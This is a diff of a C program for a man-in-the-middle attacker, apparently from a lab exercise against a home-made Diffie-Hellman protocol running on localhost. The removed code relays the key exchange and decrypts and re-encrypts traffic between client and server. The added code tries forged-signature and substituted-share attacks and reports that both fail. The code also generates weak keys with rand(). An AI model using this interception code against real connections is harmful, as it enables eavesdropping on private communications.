@@ -1,30 +1,58 @@
 #include <stdio.h>
+#include <stdlib.h>
+#include <stdint.h>
 #include <string.h>
+#include <time.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <unistd.h>
-#include <sys/select.h>
 #include <arpa/inet.h>
+
 #include <openssl/evp.h>
-#include <openssl/x509.h>
 #include <openssl/rsa.h>
-#include <openssl/pem.h>
-#include <openssl/rand.h>
 
 #include "dh.h"
 #include "../server/aes.h"
 
-EVP_PKEY *generate_fake_key()
-{
-    EVP_PKEY *key = NULL;
-    EVP_PKEY_CTX *ctx;
+int read_full(int fd, void *buf, size_t len) {
+    size_t total = 0;
 
-    ctx = EVP_PKEY_CTX_new_id(EVP_PKEY_RSA, NULL);
+    while (total < len) {
+        ssize_t n = read(fd, (unsigned char *)buf + total, len - total);
+
+        if (n <= 0)
+            return -1;
+
+        total += n;
+    }
+
+    return 0;
+}
+
+int write_full(int fd, const void *buf, size_t len) {
+    size_t total = 0;
+
+    while (total < len) {
+        ssize_t n = write(fd, (const unsigned char *)buf + total, len - total);
+
+        if (n <= 0)
+            return -1;
+
+        total += n;
+    }
+
+    return 0;
+}
+
+EVP_PKEY *generate_fake_key() {
+    EVP_PKEY *key = NULL;
+    EVP_PKEY_CTX *ctx = EVP_PKEY_CTX_new_id(EVP_PKEY_RSA, NULL);
+
+    if (ctx == NULL)
+        return NULL;
 
     EVP_PKEY_keygen_init(ctx);
-
     EVP_PKEY_CTX_set_rsa_keygen_bits(ctx, 2048);
-
     EVP_PKEY_keygen(ctx, &key);
 
     EVP_PKEY_CTX_free(ctx);
@@ -32,323 +60,268 @@ EVP_PKEY *generate_fake_key()
     return key;
 }
 
-
-int fake_sign_challenge(EVP_PKEY *fake_key, unsigned char *challenge, int challenge_len, unsigned char *signature)
-{
+int fake_sign_challenge(EVP_PKEY *fake_key, unsigned char *challenge, int challenge_len, unsigned char *signature) {
     EVP_MD_CTX *ctx;
-    size_t signature_len;
+    size_t signature_len = 0;
 
     ctx = EVP_MD_CTX_new();
 
-    EVP_DigestSignInit(ctx, NULL, EVP_sha256(), NULL, fake_key);
+    if (ctx == NULL)
+        return -1;
+
+    if (EVP_DigestSignInit(ctx, NULL, EVP_sha256(), NULL, fake_key) != 1) {
+        EVP_MD_CTX_free(ctx);
+        return -1;
+    }
+
     EVP_DigestSignUpdate(ctx, challenge, challenge_len);
-
-    signature_len = 0;
-
     EVP_DigestSignFinal(ctx, NULL, &signature_len);
 
-    EVP_DigestSignFinal(ctx, signature, &signature_len);
+    if (EVP_DigestSignFinal(ctx, signature, &signature_len) != 1) {
+        EVP_MD_CTX_free(ctx);
+        return -1;
+    }
 
     EVP_MD_CTX_free(ctx);
 
-    return signature_len;
+    return (int)signature_len;
 }
 
-void dh_client(int client_socket, unsigned char *client_aes_key)
-{
-    BN_CTX *ctx = BN_CTX_new();
-
-    BIGNUM *client_sec = BN_new();
-    BIGNUM *client_share = BN_new();
-    BIGNUM *secret = BN_new();
-    BIGNUM *client_public = BN_new();
-
-    char buf[514];
-    char x[513];
-
-    char hexa[] = {
-        '0','1','2','3','4','5','6','7', '8','9','A','B','C','D','E','F'};
-
-    for (int i = 0; i < 512; i++)
-        x[i] = hexa[rand() % 16];
-
-    x[512] = '\0';
-
-    printf("Client side private-key%s:  \n", x);
-    BN_hex2bn(&client_sec, x);
-
-    sq_mult(client_sec, client_share, ctx);
-
-    printf("MITM Fake server share: ");
-    BN_print_fp(stdout, client_share);
-    printf("\n");
-
-    int n = read(client_socket, buf, sizeof(buf) - 1);
-
-    buf[n] = '\0';
-
-    BN_hex2bn(&client_public, buf);
-
-    char *share = BN_bn2hex(client_share);
-
-    write(client_socket, share, strlen(share));
-
-    OPENSSL_free(share);
-
-    
-
-    secret_maker(client_public, client_sec, secret, ctx);
-    printf("MITM Client-side shared secret:\n");
-    BN_print_fp(stdout, secret);
-    printf("\n");
-
-
-    derive_aes_key(secret, client_aes_key);
-
-    printf("MITM Client AES key: ");
-    print_hex("", client_aes_key, AES_KEY_SIZE);
-
-
-    BN_free(client_sec);
-    BN_free(client_share);
-    BN_free(secret);
-    BN_free(client_public);
-
-    BN_CTX_free(ctx);
-}
-void dh_server(int server_socket, unsigned char *server_aes_key)
-{
-    BN_CTX *ctx = BN_CTX_new();
-
-    BIGNUM *client_sec = BN_new();
-    BIGNUM *client_share = BN_new();
-    BIGNUM *secret = BN_new();
-    BIGNUM *server_public = BN_new();
-
-    char buf[513];
-    char x[513];
-
-    char hexa[] = {
-        '0','1','2','3','4','5','6','7', '8','9','A','B','C','D','E','F'};
-
-    for (int i = 0; i < 512; i++)
-        x[i] = hexa[rand() % 16];
-
-    x[512] = '\0';
-
-    printf("Server side private-key%s:  \n", x);
-    BN_hex2bn(&client_sec, x);
-
-    sq_mult(client_sec, client_share, ctx);
-
-    printf("MITM Fake client share: ");
-    BN_print_fp(stdout, client_share);
-    printf("\n");
-
-    char *share = BN_bn2hex(client_share);
-
-    write(server_socket, share, strlen(share));
-
-    OPENSSL_free(share);
-
-    int n = read(server_socket, buf, sizeof(buf) - 1);
-
-    buf[n] = '\0';
-
-    BN_hex2bn(&server_public, buf);
-
-    printf("Server share: ");
-    BN_print_fp(stdout, server_public);
-    printf("\n");
-
-    secret_maker(server_public, client_sec, secret, ctx);
-
-    printf("[MITM] Server-side shared secret:\n");
-    BN_print_fp(stdout, secret);
-    printf("\n");
-
-    derive_aes_key(secret, server_aes_key);
-
-    printf("[MITM] Server AES key: ");
-    print_hex("", server_aes_key, AES_KEY_SIZE);
-
-    BN_free(client_sec);
-    BN_free(client_share);
-    BN_free(secret);
-    BN_free(server_public);
-
-    BN_CTX_free(ctx);
-}
-
-int main(){
-    int s,client_socket;
+int main() {
+    int s;
+    int client_socket;
     int server_socket;
 
     struct sockaddr_in addr = {0};
     struct sockaddr_in server_addr = {0};
 
-    unsigned char client_aes_key[AES_KEY_SIZE];
-    unsigned char server_aes_key[AES_KEY_SIZE];
-
     srand(time(NULL));
 
     s = socket(AF_INET, SOCK_STREAM, 0);
-    if(s< 0){
-        printf("Socket failed");
+
+    if (s < 0) {
+        printf("Socket failed\n");
+        return 1;
     }
-    
+
     addr.sin_family = AF_INET;
     addr.sin_port = htons(8000);
     addr.sin_addr.s_addr = INADDR_ANY;
 
-    bind(s, (struct sockaddr*)&addr, sizeof(addr));
+    if (bind(s, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
+        printf("Bind failed\n");
+        close(s);
+        return 1;
+    }
 
-    listen(s, 10);
+    if (listen(s, 10) < 0) {
+        printf("Listen failed\n");
+        close(s);
+        return 1;
+    }
 
-    printf("MITM Listening for client on port 8000\n\n");
+    printf("MITM listening on port 8000\n");
 
     client_socket = accept(s, NULL, NULL);
 
-    printf("MIT Client connected. Socket: %d\n", client_socket);
+    if (client_socket < 0) {
+        printf("Client accept failed\n");
+        close(s);
+        return 1;
+    }
+
+    printf("Client connected\n");
 
     server_socket = socket(AF_INET, SOCK_STREAM, 0);
 
+    if (server_socket < 0) {
+        printf("Server socket failed\n");
+        close(client_socket);
+        close(s);
+        return 1;
+    }
+
     server_addr.sin_family = AF_INET;
     server_addr.sin_port = htons(8080);
+    inet_pton(AF_INET, "127.0.0.1", &server_addr.sin_addr);
 
-    inet_pton( AF_INET, "127.0.0.1", &server_addr.sin_addr );
+    if (connect(server_socket, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
+        printf("Connection to real server failed\n");
+        close(client_socket);
+        close(server_socket);
+        close(s);
+        return 1;
+    }
 
-    connect( server_socket, (struct sockaddr *)&server_addr, sizeof(server_addr));
-
-    printf("MITM : Connected to the real server, SOcket : %d\n", server_socket);
+    printf("Connected to real server\n");
 
     uint32_t cert_len;
 
-    read(server_socket, &cert_len, sizeof(cert_len));
+    if (read_full(server_socket, &cert_len, sizeof(cert_len)) < 0)
+        goto cleanup;
 
     unsigned char *cert_data = malloc(cert_len);
 
-    read(server_socket, cert_data, cert_len);
+    if (cert_data == NULL)
+        goto cleanup;
 
-    printf("Received real serve certificate");
-    write(client_socket, &cert_len, sizeof(cert_len));
-    write(client_socket, cert_data, cert_len);
-    
-    printf("Forwarded real server certificate");
+    if (read_full(server_socket, cert_data, cert_len) < 0) {
+        free(cert_data);
+        goto cleanup;
+    }
+
+    if (write_full(client_socket, &cert_len, sizeof(cert_len)) < 0 ||
+        write_full(client_socket, cert_data, cert_len) < 0) {
+        free(cert_data);
+        goto cleanup;
+    }
+
     free(cert_data);
 
     unsigned char challenge[32];
-    int n = read(client_socket, challenge, 32);
-    printf("Intercepted client challenge");
 
-    EVP_PKEY *fake_key = generate_fake_key();
+    if (read_full(client_socket, challenge, sizeof(challenge)) < 0)
+        goto cleanup;
 
-    unsigned char fake_signature[256];
+    printf("\n1. Sign challenge\n");
+    printf("2. Relay challenge\n");
+    printf("Choose attack: ");
 
-    int fake_signature_len = fake_sign_challenge(fake_key, challenge, 32, fake_signature);
-    printf("Fake challenge completed\n");
-    uint32_t signature_len = fake_signature_len;
+    int choice;
 
-    write(client_socket, &signature_len, sizeof(signature_len));
-    write(client_socket, fake_signature, fake_signature_len);
+    if (scanf("%d", &choice) != 1)
+        goto cleanup;
 
-    printf("Fake signature sent to client\n");
+    if (choice == 1) {
+        EVP_PKEY *fake_key = generate_fake_key();
 
-    init_dh_params();
+        if (fake_key == NULL)
+            goto cleanup;
 
-    printf("Starting DH with client\n");
-    dh_client(client_socket, client_aes_key);
+        unsigned char fake_signature[256];
 
-    printf("Starting DH with server\n");
+        int fake_signature_len = fake_sign_challenge(
+            fake_key,
+            challenge,
+            sizeof(challenge),
+            fake_signature
+        );
 
-    dh_server(server_socket, server_aes_key);
-    printf("MITM: DH Completed\n\n");
-
-    while(1){
-        fd_set readfds;
-
-        FD_ZERO(&readfds);
-
-        FD_SET (client_socket, &readfds);
-        FD_SET(server_socket, &readfds);
-
-        int max_fd  = client_socket;
-
-        if(server_socket >max_fd){
-            max_fd = server_socket;
-
-        }
-        select(max_fd +1, &readfds, NULL, NULL, NULL);
-
-        if(FD_ISSET(client_socket, &readfds))
-        {
-            unsigned char encrypted[2048];
-            unsigned char plaintext[2048];
-            unsigned char encrypted_again[2048];
-
-            int n = read(client_socket, encrypted, sizeof(encrypted));
-
-            if(n <= 0){
-                break;
-            }
-            printf("\n");
-
-            int plaintext_len = decrypt_message(encrypted, n, client_aes_key, plaintext);
-            if(plaintext_len <0){
-                printf("Decryption failed\n\n");
-                continue;
-            }
-
-            plaintext[plaintext_len] = '\0';
-            printf("PLaintext from client: %s\n", plaintext);
-
-            int encrypted_len = encrypt_message(plaintext, plaintext_len, server_aes_key, encrypted_again);
-
-            // printf("Encrypted packets, sending to the server:");
-            // for (int j = 0; j < n; j++)
-            //     {
-            //         printf("%02x", encrypted_again[j]);
-            //     }
-
-            write(server_socket, encrypted_again, encrypted_len);
-            fflush(stdout);
+        if (fake_signature_len <= 0) {
+            EVP_PKEY_free(fake_key);
+            goto cleanup;
         }
 
-        if(FD_ISSET(server_socket, &readfds))
-        {
-            unsigned char encrypted[2048];
-            unsigned char plaintext[2048];
-            unsigned char encrypted_again[2048];
+        uint32_t signature_len = fake_signature_len;
 
-            int n = read(server_socket, encrypted, sizeof(encrypted));
+        write_full(client_socket, &signature_len, sizeof(signature_len));
+        write_full(client_socket, fake_signature, fake_signature_len);
 
-            if(n <= 0){
-                break;
-            }
-            printf("\n");
+        unsigned char buffer[1024];
+        int n = read(client_socket, buffer, sizeof(buffer));
 
-            // printf("Before decrypt\n");
-            int plaintext_len = decrypt_message(encrypted, n, server_aes_key, plaintext);
-            
-            // printf("After decrypt\n");
-            if(plaintext_len <0){
-                printf("Decryption failed");
-                continue;
-            }
-
-            plaintext[plaintext_len] = '\0';
-            printf("PLaintext from Server: %s\n", plaintext);
-
-            int encrypted_len = encrypt_message(plaintext, plaintext_len, client_aes_key, encrypted_again);
-
-            write(client_socket, encrypted_again, encrypted_len);
-            fflush(stdout);
+        if (n <= 0) {
+            printf("\n[MALLORY] MITM attack failed\n");
+            printf("[MALLORY] Client rejected the forged signature\n");
+        } else {
+            printf("\n[MALLORY] MITM attack failed\n");
         }
 
+        EVP_PKEY_free(fake_key);
+    } else if (choice == 2) {
+        if (write_full(server_socket, challenge, sizeof(challenge)) < 0)
+            goto cleanup;
 
+        uint32_t signature_len;
+
+        if (read_full(server_socket, &signature_len, sizeof(signature_len)) < 0)
+            goto cleanup;
+
+        if (signature_len == 0 || signature_len > 256)
+            goto cleanup;
+
+        unsigned char signature[256];
+
+        if (read_full(server_socket, signature, signature_len) < 0)
+            goto cleanup;
+
+        uint32_t share_len;
+
+        if (read_full(server_socket, &share_len, sizeof(share_len)) < 0)
+            goto cleanup;
+
+        if (share_len == 0 || share_len >= 514)
+            goto cleanup;
+
+        char real_server_share[514];
+
+        if (read_full(server_socket, real_server_share, share_len) < 0)
+            goto cleanup;
+
+        real_server_share[share_len] = '\0';
+
+        init_dh_params();
+
+        BN_CTX *ctx = BN_CTX_new();
+        BIGNUM *mallory_sec = BN_new();
+        BIGNUM *mallory_share = BN_new();
+
+        char private_key[513];
+        char hexa[] = {
+            '0','1','2','3','4','5','6','7',
+            '8','9','A','B','C','D','E','F'
+        };
+
+        for (int i = 0; i < 512; i++)
+            private_key[i] = hexa[rand() % 16];
+
+        private_key[512] = '\0';
+
+        BN_hex2bn(&mallory_sec, private_key);
+        sq_mult(mallory_sec, mallory_share, ctx);
+
+        char *mallory_share_hex = BN_bn2hex(mallory_share);
+
+        if (mallory_share_hex == NULL) {
+            BN_free(mallory_sec);
+            BN_free(mallory_share);
+            BN_CTX_free(ctx);
+            free_dh_params();
+            goto cleanup;
+        }
+
+        uint32_t mallory_share_len = strlen(mallory_share_hex);
+
+        write_full(client_socket, &signature_len, sizeof(signature_len));
+        write_full(client_socket, signature, signature_len);
+        write_full(client_socket, &mallory_share_len, sizeof(mallory_share_len));
+        write_full(client_socket, mallory_share_hex, mallory_share_len);
+
+        unsigned char buffer[1024];
+        int n = read(client_socket, buffer, sizeof(buffer));
+
+        if (n <= 0) {
+            printf("\n[MALLORY] MITM attack failed\n");
+            printf("[MALLORY] Client rejected the substituted DH share\n");
+        } else {
+            printf("\n[MALLORY] MITM attack failed\n");
+        }
+
+        OPENSSL_free(mallory_share_hex);
+
+        BN_free(mallory_sec);
+        BN_free(mallory_share);
+        BN_CTX_free(ctx);
+
+        free_dh_params();
+    } else {
+        printf("\nInvalid choice\n");
     }
+
+cleanup:
     close(client_socket);
     close(server_socket);
-    free_dh_params();
+    close(s);
+
     return 0;
 }
